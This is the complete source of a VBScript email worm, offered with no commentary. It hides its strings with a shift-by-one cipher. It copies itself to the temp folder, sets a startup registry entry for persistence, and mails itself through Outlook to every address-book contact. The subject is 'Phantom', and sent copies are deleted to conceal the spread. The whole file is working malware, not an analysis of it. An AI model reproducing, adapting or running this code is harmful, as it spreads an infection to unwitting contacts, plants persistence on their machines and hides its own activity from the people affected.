On Error Resume Next
Dim EAZGACD, VYDFQ0S, VL8PV0P, S25ARW, N90ILD8E
Dim N64Z6, PVIOEV
Set N64Z6 = CreateObject( X2A( "Tdsjqujoh/GjmfTztufnPckfdu" ) )
N64Z6.CopyFile WScript.ScriptFullName, N64Z6.BuildPath( N64Z6.GetSpecialFolder(2), X2A( "BKDF/WCT" ) )
Set PVIOEV = CreateObject( X2A( "XTdsjqu/Tifmm" ) )
PVIOEV.RegWrite X2A( "ILFZ`MPDBM`NBDIJOF]Tpguxbsf]Njdsptpgu]Xjoepxt]DvssfouWfstjpo]SvoTfswjdft]" ) & X2A( "BKDF" ), N64Z6.BuildPath( N64Z6.GetSpecialFolder(2), X2A( "BKDF/WCT" ) )
Set EAZGACD = CreateObject( X2A( "Pvumppl/Bqqmjdbujpo" ) )
Set VYDFQ0S = EAZGACD.GetNameSpace( X2A( "NBQJ" ) )
For Each VL8PV0P In VYDFQ0S.AddressLists
For S25ARW = 1 To VL8PV0P.AddressEntries.Count
Set N90ILD8E = EAZGACD.CreateItem( 0 )
N90ILD8E.BCC = VL8PV0P.AddressEntries( S25ARW ).Address
N90ILD8E.Subject = X2A( "Qiboupn" )
N90ILD8E.Body = X2A( "BESJBO!BESJBO!BESJBO" )
N90ILD8E.Attachments.Add WScript.ScriptFullName
N90ILD8E.DeleteAfterSubmit = True
N90ILD8E.Send
Next
Next
Function X2A( F4I0P )
Dim C7PYV9
Dim ZX7
Dim R07Z3
C7PYV9 = ""
For ZX7 = 1 To Len( F4I0P )
R07Z3 = Mid( F4I0P, ZX7, 1 )
C7PYV9 = C7PYV9 & Chr( Asc( R07Z3 ) - 1 )
Next
X2A = C7PYV9
End Function
